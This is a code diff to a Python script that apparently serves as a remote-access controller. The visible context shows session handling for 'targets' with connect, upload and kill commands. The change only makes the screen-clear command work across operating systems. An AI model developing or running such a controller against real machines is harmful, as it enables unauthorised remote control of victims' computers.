@@ -4,8 +4,13 @@ import  requests
 import json
 import os
 import threading
+import platform
 from os.path import *
 
+if platform.system() == "Windows":
+    clear = "cls"
+else:
+    clear = "clear"
 
 f = open('serverport.txt', 'r').read()
 if f == "{}" or "":
@@ -309,7 +314,7 @@ def target_communication(target, ip):
             elif command == 'back':
                 break
             elif command == 'clear':
-                os.system('cls')
+                os.system(clear)
             elif command[:6] == 'upload':
 
                     print('[*] uploading file')
@@ -520,7 +525,7 @@ while True:
             print('Session ' + str(counter) + ' --- ' + str(ip))
             counter += 1
     elif command == 'clear':
-        os.system('cls')
+        os.system(clear)
     elif command[:7] == 'connect':
         try:
             global num
@@ -567,7 +572,7 @@ while True:
         t1.join()
         break
     elif command == 'clear':
-        os.system('cls')
+        os.system(clear)
     elif command[:4] == 'kill':
         targ = targets[int(command[5:])]
         ip = ips[int(command[5:])]
